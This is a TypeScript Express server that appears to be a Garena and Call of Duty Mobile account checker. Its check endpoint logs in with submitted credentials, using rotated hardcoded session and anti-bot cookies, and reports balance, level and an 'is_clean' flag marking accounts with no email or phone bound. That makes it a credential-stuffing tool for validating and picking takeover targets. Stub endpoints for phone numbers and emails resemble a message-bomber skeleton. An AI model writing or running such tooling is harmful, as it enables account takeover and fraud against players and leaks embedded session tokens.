import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import axios from "axios";
import { fileURLToPath } from "url";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import crypto from "crypto";
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- Garena Logic ---
const GARENA_API = "https://sso.garena.com/api/v1";
const CODM_APP_ID = 100082;

// Provided cookies
const PRESET_COOKIES = [
  "datadome=CJhwf2dsyEBHuxYkwd8pFRxBw7hFCEDN6x3O0jmLHvQAjdDsizkk4BtOA~_mIWJAamcH4MqkR~gzG9jOZmZDevnHwHPg6iea3jjjC4YRokEHYYb8Az~HbbTUEZ1UutzI; sso_key=7c6040e9fb20450045a019bb48d2b12e2258525a22546bc879be1d72fad26054; token_session=ff8025e38986dce61cd8559cb12576edd5237f62336a30721057db7e4c83b96483f7c0bddc373552d472a477f27a90df; ac_session=pdhi1s7v9pelqo6o8e67ua9qq7162wem; session_key=wb2g5bo4wacu2qil4tg76t9w2p2cp3ex",
  "datadome=ruF_N5RsMx8cFmbsQIbBeLK9ZRUyQLM1Q2ET1Q6VHKYM0BzcXbLroeMQtiEH56VaddFh7PWm4ehToTIwhTd7hNyKUcmLPV~mhPaekdBbx28dJ8eij3NnsSs4megkJtQj; sso_key=bf4c34fa9a02bf3adcdeb74de564d487156b070847cfe305c9e4b191b9253a0b; token_session=013d66b52ec3fee757e9d8cfdb6fe3da8870f7bd5b93ebb0081916efd69bc3059a48cf1eb11de92485b477b951b58d9c; ac_session=3ygrqo1wug7l7qhrfqcjuurzgzyeq1xs; session_key=ksrr0slatvv9g41nn2ee5jn3buq6eztmwr0wymCw5eRLY3QWs2uiQmuOROsA~FIHqTPRfcfAqjHH6LA2Ww2df0d3b3l4~DW7Xx8pcCIuY8N~zrXZSWzNTE0SRHnY6NARmeoE9QdhJbjIstSP~FnBGIvyKm2pyrt1"
];

function getPassMd5(password: string): string {
  return crypto.createHash("md5").update(password).digest("hex");
}

function hashPassword(password: string, vcode: string): string {
  const md5Pass = getPassMd5(password);
  return crypto.createHash("md5").update(md5Pass + vcode.toLowerCase()).digest("hex");
}

// --- Services ---
const services = [
  { name: "Service 1", handler: async (num: string) => 200 },
  { name: "Service 2", handler: async (num: string) => 200 },
  { name: "Service 3", handler: async (num: string) => 200 },
  { name: "Service 4", handler: async (num: string) => 200 },
  { name: "Service 5", handler: async (num: string) => 200 },
];

const emailServices = [
  { name: "Gmail", handler: async (email: string) => 200 },
  { name: "Outlook", handler: async (email: string) => 200 },
  { name: "Yahoo", handler: async (email: string) => 200 },
];

async function startServer() {
  const app = express();

  app.use(helmet({
    contentSecurityPolicy: false,
  }));
  app.use(express.json());

  // Rate limiting
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
  });
  app.use("/api/", limiter);

  // Garena Checker API
  app.post("/api/garena/check", async (req, res) => {
  const requestJar = new CookieJar();
  const requestClient = wrapper(axios.create({ jar: requestJar }));

  try {
    const { account, password } = req.body;
    if (!account || !password) {
      return res.status(400).json({ error: "Account and password are required" });
    }

    // Apply a fresh preset cookie to this request's jar
    const cookieStr = PRESET_COOKIES[Math.floor(Math.random() * PRESET_COOKIES.length)];
    cookieStr.split('; ').forEach(c => {
      try {
        requestJar.setCookieSync(c, 'https://sso.garena.com');
        requestJar.setCookieSync(c, 'https://account.garena.com');
        requestJar.setCookieSync(c, 'https://100082.connect.garena.com');
      } catch (e) {}
    });

    // 1. Prelogin
    const prelogin = await requestClient.get(`${GARENA_API}/prelogin`, {
      params: { account, format: "json" },
      timeout: 10000
    }).then(r => r.data);

    if (prelogin.error) {
      return res.json({ status: "FAILED", error: prelogin.error });
    }

    // 2. Login
    const passwordHash = hashPassword(password, prelogin.vcode);
    const loginData = await requestClient.post(`${GARENA_API}/login`, {
      account,
      password: passwordHash,
      vcode: prelogin.vcode,
      format: "json"
    }, { timeout: 10000 }).then(r => r.data);

    if (loginData.error) {
      return res.json({ status: "FAILED", error: loginData.error });
    }

    // 3. Get Full Account Details
    const accountInit = await requestClient.get('https://account.garena.com/api/account/init', {
      headers: {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
      },
      timeout: 10000
    }).then(r => r.data).catch(() => null);
    
    // 4. Check CODM Info
    let codmInfo = null;
    try {
      const tokenRes = await requestClient.get('https://100082.connect.garena.com/api/login/token', {
        params: {
          access_token: loginData.access_token,
          redirect_uri: 'https://codm.garena.com/',
          response_type: 'token',
          app_id: CODM_APP_ID
        },
        timeout: 10000
      });
      
      if (tokenRes.data && tokenRes.data.token) {
        const codmRes = await requestClient.get('https://codm.garena.com/api/user/info', {
          params: { token: tokenRes.data.token },
          timeout: 10000
        });
        if (codmRes.data && codmRes.data.nickname) {
          codmInfo = {
            nickname: codmRes.data.nickname,
            level: codmRes.data.level || 0,
            region: codmRes.data.region || 'Unknown',
            uid: codmRes.data.uid || 'N/A'
          };
        }
      }
    } catch (e) {
      console.error("[CODM Info] Error:", e.message);
    }

    const userInfo = accountInit?.user_info || {};
    
    res.json({ 
      status: "SUCCESS", 
      data: {
        uid: loginData.uid || userInfo.uid,
        nickname: loginData.nickname || userInfo.nickname,
        account: loginData.account || userInfo.username,
        email: userInfo.email,
        email_status: userInfo.email_v ? "Verified" : "Unverified",
        mobile_status: userInfo.mobile_no ? "Bound" : "Unbound",
        shell_balance: userInfo.shell || 0,
        codm: codmInfo,
        is_clean: !userInfo.email_v && !userInfo.mobile_no && !userInfo.is_fbconnect_enabled
      }
    });
  } catch (error: any) {
    const errorMsg = error.response?.data?.error || error.message;
    console.error(`[Garena] Error: ${errorMsg}`);
    res.json({ status: "FAILED", error: errorMsg });
  }
});

  // Local API handler (matches Netlify Function logic)
  app.post("/api/api", async (req, res) => {
    try {
      const { number, serviceIndex } = req.body;
      console.log(`[API] Request for ${number} using service index ${serviceIndex}`);
      
      const idx = parseInt(serviceIndex);
      const service = services[idx];
      
      if (!service) {
        console.error(`[API] Invalid service index: ${serviceIndex}`);
        return res.status(400).json({ error: `Invalid service index: ${serviceIndex}` });
      }

      const status = await service.handler(number);
      res.json({ name: service.name, status: "SUCCESS", code: status });
    } catch (error: any) {
      console.error(`[API] Service error: ${error.message}`);
      res.json({ status: "FAILED", error: error.message });
    }
  });

  app.post("/api/email", async (req, res) => {
    try {
      const { email, serviceIndex } = req.body;
      console.log(`[Email API] Request for ${email} using service index ${serviceIndex}`);
      
      const idx = parseInt(serviceIndex);
      const service = emailServices[idx];
      
      if (!service) {
        return res.status(400).json({ error: `Invalid service index: ${serviceIndex}` });
      }

      const status = await service.handler(email);
      res.json({ name: service.name, status: "SUCCESS", code: status });
    } catch (error: any) {
      console.error(`[Email API] Service error: ${error.message}`);
      res.json({ status: "FAILED", error: error.message });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  const PORT = parseInt(process.env.PORT || "3000", 10);
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
